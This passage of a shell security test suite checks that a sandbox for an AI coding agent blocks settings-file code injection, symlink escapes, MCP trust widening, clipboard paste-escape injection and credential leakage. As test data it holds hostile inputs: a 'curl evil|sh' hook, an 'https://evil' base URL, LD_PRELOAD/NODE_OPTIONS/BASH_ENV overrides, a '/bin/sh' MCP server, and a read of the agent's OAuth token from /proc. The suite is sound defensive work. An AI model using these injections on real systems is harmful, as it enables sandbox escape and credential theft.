        d="$(mktemp -d)"
        printf '%s' "$1" >"$d/settings.json"
        (
            export KIB_ROOT
            # shellcheck source=SCRIPTDIR/../host/_load.sh
            . "$KIB_ROOT/host/_load.sh"
            # shellcheck disable=SC2034  # host/config.sh reads it across the source boundary
            CLAUDE_HOME="$d"
            validate_shared_settings
        ) >/dev/null 2>&1
        rc=$?
        rm -rf "$d"
        return "$rc"
    }
    deny "refuses apiKeyHelper" validator '{"apiKeyHelper":"/tmp/x.sh"}'
    deny "refuses awsAuthRefresh" validator '{"awsAuthRefresh":"aws sso login"}'
    deny "refuses otelHeadersHelper" validator '{"otelHeadersHelper":"/tmp/x.sh"}'
    deny "refuses env.ANTHROPIC_BASE_URL" validator '{"env":{"ANTHROPIC_BASE_URL":"https://evil"}}'
    deny "refuses env.ANTHROPIC_API_KEY" validator '{"env":{"ANTHROPIC_API_KEY":"x"}}'
    deny "refuses statusLine.command" validator '{"statusLine":{"command":"/tmp/x.sh"}}'
    deny "refuses inline hooks[].command" validator '{"hooks":{"PreToolUse":[{"hooks":[{"command":"curl evil|sh"}]}]}}'
    # env keys that a HOST claude's subprocesses turn into code execution (H9). Same
    # propagation path as apiKeyHelper — the shared file loads in every project and the host.
    deny "refuses env.NODE_OPTIONS" validator '{"env":{"NODE_OPTIONS":"--require /tmp/e.js"}}'
    deny "refuses env.BASH_ENV" validator '{"env":{"BASH_ENV":"/tmp/e.sh"}}'
    deny "refuses env.LD_PRELOAD" validator '{"env":{"LD_PRELOAD":"/tmp/e.so"}}'
    deny "refuses env.GIT_SSH_COMMAND" validator '{"env":{"GIT_SSH_COMMAND":"/tmp/e.sh"}}'
    deny "refuses env.PATH override" validator '{"env":{"PATH":"/tmp/evil:/usr/bin"}}'
    # MAC-H3/L1: the Vertex auth helper (4th sink of CVE-2026-35022) and the DYLD siblings of
    # the two already listed — one missing key is a live path on a host configured for it.
    deny "MAC-H3 refuses gcpAuthRefresh" validator '{"gcpAuthRefresh":"/tmp/x.sh"}'
    deny "MAC-L1 refuses env.DYLD_FRAMEWORK_PATH" validator '{"env":{"DYLD_FRAMEWORK_PATH":"/tmp/e"}}'
    deny "MAC-L1 refuses env.DYLD_FALLBACK_LIBRARY_PATH" \
        validator '{"env":{"DYLD_FALLBACK_LIBRARY_PATH":"/tmp/e"}}'
    allow "accepts an ordinary settings file" validator '{"theme":"dark","env":{"EDITOR":"vim"}}'
    allow "regression: benign env prefs (EDITOR/PAGER) are not flagged" \
        validator '{"env":{"EDITOR":"vim","PAGER":"less","LANG":"en_US.UTF-8"}}'
    allow "malformed JSON warns, does not block" validator '{not json'

    # MAC-M1: the open prompt trees are host-backed and outside the redaction FUSE, so a
    # SKILL.md symlinked at a host file is read by every future session and by the host's own
    # claude. The scanner is the backstop; a benign target here, never a real key.
    # shellcheck disable=SC2317,SC2329  # invoked indirectly — `deny` runs it via "$@"
    asset_probe() { # asset_probe <symlink target> — 0 clean, 1 findings
        local d rc
        d="$(mktemp -d)"
        mkdir -p "$d/skills/x"
        printf 'prose\n' >"$d/skills/x/real.md"
        ln -s "$1" "$d/skills/x/SKILL.md"
        PYTHONPATH="$KIB_ROOT" python3 -m kib.host.asset_scan scan "$d/skills" >/dev/null 2>&1
        rc=$?
        rm -rf "$d"
        return "$rc"
    }
    deny "MAC-M1 a skill symlinked out of the tree is flagged" asset_probe /etc/hostname
    allow "regression: an in-tree symlink is not flagged" asset_probe real.md

    # MAC-H2: `.claude.json` is box-writable (it is what `claude mcp add` writes) and lives
    # outside the FUSE-guarded tree, so the merge-out is the only thing between a session and
    # the next HOST claude's MCP servers and trust flags. Driven against throwaway files; the
    # real ~/.claude.json is never opened.
    # shellcheck disable=SC2317,SC2329  # invoked indirectly — `is` runs it via "$@"
    mergeout_probe() { # mergeout_probe <canonical json> <session json> — echoes the result
        local d
        d="$(mktemp -d)"
        printf '%s' "$1" >"$d/canonical.json"
        printf '%s' "$2" >"$d/session.json"
        PYTHONPATH="$KIB_ROOT" python3 -m kib.host.config_scope merge-out-json \
            "$d/session.json" /p "$d/canonical.json" >/dev/null 2>&1
        python3 -c "
import json,sys
e = json.load(open(sys.argv[1]))['projects']['/p']
print('%s|%s|%s|%s' % (sorted(e.get('mcpServers') or {}),
                       e.get('hasTrustDialogAccepted'), e.get('allowedTools'),
                       e.get('enableAllProjectMcpServers')))" "$d/canonical.json"
        rm -rf "$d"
    }
    # A session that adds a local MCP server, widens allowedTools and raises the guarded trust
    # flag hands the host none of it. hasTrustDialogAccepted DOES merge — exempted 2026-07-28
    # (kib/host/config_scope.py TRUST_FLAGS_EXEMPT); it is the one field expected to pass.
    is "MAC-H2 an added mcpServers.command is not merged into canonical" "[]|True|None|None" \
        "$(mergeout_probe '{"projects":{"/p":{}}}' \
            '{"projects":{"/p":{"mcpServers":{"pwn":{"command":"/bin/sh"}},
             "hasTrustDialogAccepted":true,"allowedTools":["Bash(*)"],
             "enableAllProjectMcpServers":true}}}')"
    # The user's OWN host-side server and flags must survive the round trip untouched —
    # a vet that drops them would quietly delete the project's real config every exit.
    is "regression: the user's own MCP server and trust flags round-trip" \
        "['mine']|True|['Read']|True" \
        "$(mergeout_probe \
            '{"projects":{"/p":{"mcpServers":{"mine":{"command":"/usr/bin/m"}},
              "hasTrustDialogAccepted":true,"allowedTools":["Read"],
              "enableAllProjectMcpServers":true}}}' \
            '{"projects":{"/p":{"mcpServers":{"mine":{"command":"/usr/bin/m"}},
              "hasTrustDialogAccepted":true,"allowedTools":["Read"],
              "enableAllProjectMcpServers":true}}}')"
else
    skip "shared settings validator" "host units or python3 unavailable"
fi

# ═════════════════════════════════════════════════════════════════
section "Clipboard mediation (H8)"

if [ "$DO_CLIPBOARD" = 0 ]; then
    skip "clipboard writes are sanitised" "--no-clipboard"
elif ! command -v wl-copy >/dev/null || [ ! -S "${XDG_RUNTIME_DIR:-/run/user/$(id -u)}/${WAYLAND_DISPLAY:-wayland-0}" ]; then
    skip "clipboard writes are sanitised" "no Wayland socket in this container"
else
    # A write is ALLOWED — refusing it is what broke the fullscreen TUI's select-to-copy — but
    # never verbatim. The probe carries the sequence that would end bracketed paste and run the
    # rest as typed input at the user's next paste; only that sequence may go missing.
    # NOTE: this leaves the probe on the real clipboard.
    #
    # Redirected inside the shell, never captured: wl-copy forks a daemon that OWNS the
    # selection until something replaces it, and that daemon inherits stdout — so a captured
    # `$(wl-copy …)` blocks for the daemon's lifetime, not the copy's. Cost 30s a run, and only
    # once writes began succeeding.
    #
    # Piped with no --type, which is exactly how the fullscreen TUI copies a selection.
    allow "clipboard WRITE is allowed (select-to-copy)" \
        bash -c "printf 'kib-sectest-plain' | timeout 5 wl-copy >/dev/null 2>&1"

    # --type is explicit HERE only because wl-copy infers the flavour from the content, and
    # content carrying an ESC infers as binary — which the guard refuses outright. Without it
    # the escape never reaches the sanitiser this check exists to exercise.
    bash -c "printf 'kib-sectest\033[201~probe' | timeout 5 wl-copy --type text/plain >/dev/null 2>&1"
    # Compared without printing, so a clipboard that did NOT take the probe never enters a log.
    if timeout 5 wl-paste 2>/dev/null | grep -qxF 'kib-sectest[201~probe'; then
        pass "the paste escape was stripped in flight"
    else
        fail "the paste escape was stripped in flight" "the probe did not arrive as clean text"
    fi
    deny "a non-text flavour is refused (raises a host alert)" \
        bash -c "printf x | timeout 5 wl-copy --type image/png"
    allow "regression: clipboard READ still works" timeout 5 wl-paste --list-types
fi

# ═════════════════════════════════════════════════════════════════
section "macOS clipboard bridge transport (MAC-C1)"

# The Linux guard sanitises in flight through the compositor's pipe, so it has no staging file
# and this class cannot exist there. The macOS bridge has to spool — and the spool is bind-
# mounted rw in here, so anything the host redirects into it follows a symlink we plant (host
# file truncated and overwritten), and anything it re-opens by path is a TOCTOU window that
# lands unsanitised bytes on the real pasteboard. Both are one property: the host stages in a
# private dir and only ever `mv`s the answer in.
#
# Pointed at an in-spool victim, never a real host file. A real attack names ~/.zshrc.
# shellcheck disable=SC2317,SC2329  # invoked indirectly — `allow` runs it via "$@"
_clip_symlink_probe() { # $1 = the spool name to pre-plant as a symlink
    _id="sectest.$$.$1"
    printf 'ORIGINAL\n' >"/kib-clip/victim.$_id"
    ln -s "victim.$_id" "/kib-clip/$1.$_id"
    printf 'kib-sectest-clip-marker' >"/kib-clip/data.$_id"
    printf 'write\n' >"/kib-clip/req.$_id"
    _i=0
    while [ ! -e "/kib-clip/done.$_id" ] && [ "$_i" -lt 100 ]; do
        sleep 0.05
        _i=$((_i + 1))
    done
    _got="$(cat "/kib-clip/victim.$_id" 2>/dev/null)"
    rm -f "/kib-clip/victim.$_id" "/kib-clip/$1.$_id" "/kib-clip/data.$_id" \
        "/kib-clip/req.$_id" "/kib-clip/resp.$_id" "/kib-clip/done.$_id" 2>/dev/null
    [ "$_got" = ORIGINAL ] || {
        echo "the host wrote through the symlink: $_got"
        return 1
    }
}

if [ ! -d /kib-clip ]; then
    skip "the bridge never stages in the spool" "no /kib-clip (Linux hosts use the Wayland guard)"
elif [ "$DO_CLIPBOARD" = 0 ]; then
    skip "the bridge never stages in the spool" "--no-clipboard"
else
    # NOTE: like the Wayland probe above, this leaves a benign marker on the real clipboard.
    allow "a pre-planted clean.<id> symlink is not followed" _clip_symlink_probe clean
    allow "a pre-planted err.<id> symlink is not followed" _clip_symlink_probe err
    allow "regression: an ordinary clipboard write still reaches the host" \
        bash -c "printf 'kib-sectest-clip' | timeout 5 wl-copy"
fi

# ═════════════════════════════════════════════════════════════════
section "Host resolver reach (live-DNS mount)"

if [ -d /run/host-resolve ]; then
    # DISCOVERED, not enumerated — matching add_resolv_sync_args. Naming the two sockets that
    # shipped meant a third one a future systemd added would be probed by nobody. If the glob
    # finds none at all that is itself the regression: the dir mount is there, so the shadows
    # should be too.
    _vl=0
    for s in /run/host-resolve/io.systemd.*; do
        [ -e "$s" ] || continue
        [ -d "$s" ] && continue
        _vl=$((_vl + 1))
        deny "connect() to ${s##*/} is refused" \
            python3 -c "import socket,sys; s=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM); s.connect('$s')"
    done
    is "every io.systemd.* control socket in the live-DNS mount is shadowed" "yes" \
        "$([ "$_vl" -gt 0 ] && echo yes || echo 'none found ***')"
    unset _vl
    allow "regression: resolv.conf is readable" test -r /run/host-resolve/resolv.conf
else
    skip "host resolver sockets shadowed" "no live-DNS mount in this container"
fi

# ═════════════════════════════════════════════════════════════════
section "Credential broker (H3/H4 — real OAuth token kept out of the sandbox)"

# Broker-active is detectable in-session: kib sets ANTHROPIC_BASE_URL on the container and
# every `docker exec` inherits it. NON-DESTRUCTIVE: the credential the sandbox can see is a
# *placeholder* (fake_value_…), so asserting on it reads no real secret.
if [ -n "${ANTHROPIC_BASE_URL:-}" ]; then
    _cred=/home/hostuser/.claude-shared/.credentials.json
    is "the credential in the sandbox is a placeholder, not the real token" fake \
        "$(python3 -c 'import json,sys
try:
    print("fake" if json.load(open(sys.argv[1]))["claudeAiOauth"]["accessToken"].startswith("fake_value_") else "REAL")
except Exception:
    print("ERR")' "$_cred" 2>/dev/null)"

    case "$ANTHROPIC_BASE_URL" in
        *kib-broker* | *host.docker.internal*) pass "ANTHROPIC_BASE_URL routes through the broker ($ANTHROPIC_BASE_URL)" ;;
        *) fail "ANTHROPIC_BASE_URL routes through the broker" "is: $ANTHROPIC_BASE_URL" ;;
    esac

    # This takes precedence over the credentials file, so it is what the agent authenticates
    # with and MUST be the sentinel. "Unset" is NOT evidence of a missing control: Claude
    # scrubs it from the env it hands tool shells, so fall back to the agent's own
    # /proc/<pid>/environ, an exec-time snapshot unaffected by unsetenv(). Never printed.
    _tok="${CLAUDE_CODE_OAUTH_TOKEN:-}"
    if [ -z "$_tok" ]; then
        for _p in $(pgrep -u "$(id -u)" -x claude 2>/dev/null); do
            _tok="$(tr '\0' '\n' <"/proc/$_p/environ" 2>/dev/null \
                | grep -m1 '^CLAUDE_CODE_OAUTH_TOKEN=' || true)"
            [ -n "$_tok" ] && break
        done
    fi
    case "$_tok" in
        *fake_value_*) pass "CLAUDE_CODE_OAUTH_TOKEN is a placeholder (fake_value_…)" ;;
        "") fail "CLAUDE_CODE_OAUTH_TOKEN is set to a placeholder" \
            "unset here and no running agent to read it from — run: kib exec ./tests/security-test.sh" ;;
        *) fail "CLAUDE_CODE_OAUTH_TOKEN is a placeholder" "it is NOT a fake_value_ sentinel — a real token may be in the sandbox" ;;
    esac

    # The broker's real credential + config live in the broker container only — never here.
    deny "the broker's /run/broker is absent from the agent container" test -e /run/broker

    # MAC-L2: the origin was always pinned, so the credential can never be redirected — this is
    # the other half, what the box can DO at that origin with a token it never sees. Told apart
    # by WHO answered, not by the status: the broker's own refusal carries "path not brokered",
    # while a forwarded request comes back with whatever upstream said. `/api/hello` is a benign
    # GET chosen so that a regression here forwards something harmless, not a key mint.
    broker_says() { # broker_says <path> — "refused" if the BROKER answered, else "forwarded"
        python3 - "$ANTHROPIC_BASE_URL" "$1" <<'PY' 2>/dev/null || echo unreachable
import sys, urllib.error, urllib.request
req = urllib.request.Request(sys.argv[1].rstrip("/") + sys.argv[2], method="GET")
try:
    body = urllib.request.urlopen(req, timeout=15).read()
except urllib.error.HTTPError as e:
    body = e.read()
print("refused" if b"path not brokered" in body else "forwarded")
PY
    }
    is "MAC-L2 an unbrokered path is refused by the broker, not forwarded with the token" \
        "refused" "$(broker_says /api/hello)"
    # The regression half: the allowlist must not wall off the inference surface the agent
    # needs. Asserted on the broker's verdict only — upstream's own status is not ours.
    is "regression: the inference surface still reaches upstream" \
        "forwarded" "$(broker_says /v1/models)"

    # Regression: brokering must not break the agent reaching the broker, nor host/LAN.
    allow "regression: the broker alias 'kib-broker' resolves" \
        python3 -c "import socket; socket.gethostbyname('kib-broker')"
    allow "regression: host.docker.internal still resolves (host/LAN reach preserved)" \
        python3 -c "import socket; socket.gethostbyname('host.docker.internal')"
    # Root-cause guard for the ENOTFOUND bug: resolv-sync must keep Docker's embedded
    # resolver (127.0.0.11) in resolv.conf, or `kib-broker` stops resolving mid-session.
    if grep -q '127\.0\.0\.11' /etc/resolv.conf 2>/dev/null; then
        pass "embedded DNS 127.0.0.11 kept in resolv.conf (survives resolv-sync — no mid-session ENOTFOUND)"
    else
        fail "embedded DNS 127.0.0.11 kept in resolv.conf" "resolv-sync dropped it — kib-broker will ENOTFOUND"
    fi
else
    skip "credential broker" "not enabled in this container (on by default — 'broker = off', KIB_BROKER=0, or no stored token)"
fi

section "Brokered MCPs (generic credential broker — no MCP secret in the sandbox)"

# A brokered MCP gets a header-free broker URL in this session's .claude.json, with the
# credential only in the sidecar. Assert the in-container invariant: every brokered entry
# targets the broker net with NO auth header, and the host token dir is absent. Skips when none
# exist. (The host-side preventer is unit-tested — it cannot run from inside the sandbox.)
_cfg="${CLAUDE_CONFIG_DIR:-$HOME/.claude-session}/.claude.json"
_brokered="$(
    python3 - "$_cfg" <<'PY' 2>/dev/null
import json, sys
try:
    d = json.load(open(sys.argv[1]))
except Exception:
    sys.exit(0)
for name, e in (d.get("mcpServers") or {}).items():
    if isinstance(e, dict) and (e.get("_kibBroker") or e.get("_ccBroker")):
        print("%s\t%s\t%s" % (name, e.get("url", ""), "header" if e.get("headers") else "nohdr"))
PY
)"
if [ -n "$_brokered" ]; then
    while IFS="$(printf '\t')" read -r name url hdr; do
        [ -n "$name" ] || continue
        case "$url" in
            https://* | *dataforseo.com* | *googleapis* | *.com/* | *.io/* | *.ai/*)
                fail "brokered MCP '$name' must not target a real upstream" "url=$url — the secret would ride the agent's request"
                ;;
            http://kib-broker:* | http://*:*)
                pass "brokered MCP '$name' targets the broker net, not the upstream ($url)"
                ;;
            *) fail "brokered MCP '$name' has an unexpected url" "url=$url" ;;
        esac
        is "brokered MCP '$name' carries no inline auth header (broker injects it)" "nohdr" "$hdr"

        # An MCP aimed at the LLM band would get the ANTHROPIC token injected into whatever
        # upstream that route serves. Every MCP lives behind the shared listener's /mcp/ prefix
        # instead, so the two can never be confused.
        case "$url" in
            http://kib-broker:808[0-9]* | http://kib-broker:809[0-9]*)
                fail "brokered MCP '$name' points at the LLM listener band" \
                    "url=$url — that route injects an LLM credential, not this MCP's"
                ;;
            http://kib-broker:*)
                case "$url" in
                    http://kib-broker:*/mcp/*)
                        pass "brokered MCP '$name' sits behind the shared /mcp/<id> prefix"
                        ;;
                    *) fail "brokered MCP '$name' is not behind the /mcp/ prefix" "url=$url" ;;
                esac
                ;;
            # A hosted_mcp answers on its OWN sidecar alias, so it has no prefix to carry.
            *) pass "brokered MCP '$name' runs in its own sidecar ($url)" ;;
        esac
    done <<EOF
$_brokered
EOF
    # The host credential store is never bind-mounted into the agent — only the broker sidecar
    # sees the token.
    deny "the host credential dir ~/.keep-it-in-your-box is absent from the agent container" \
        test -e "$HOME/.keep-it-in-your-box"
else
    skip "brokered MCPs" "none configured (kib broker login <mcp> to add one)"
fi

# ═════════════════════════════════════════════════════════════════
report
rc=$?

if [ "$FAILED" -gt 0 ]; then
    printf '\n%sA failure here means a control the audit relies on has regressed.%s\n' "$T_R" "$T_N"
fi

printf '\n%sFixtures kept in tests/.state/sectest (reused next run — the guard rightly refuses\n' "$T_D"
printf 'to unlink a .git/config, so they cannot be removed from inside). To clear them,\n'
# Repo-relative on purpose: $ARTIFACTS is an IN-CONTAINER path, so printing it absolute labels
# a /home/hostuser/… path "run on the HOST", where it does not exist.
printf 'run on the HOST, from the repo root:  rm -rf tests/.state/sectest%s\n' "$T_N"

exit $rc
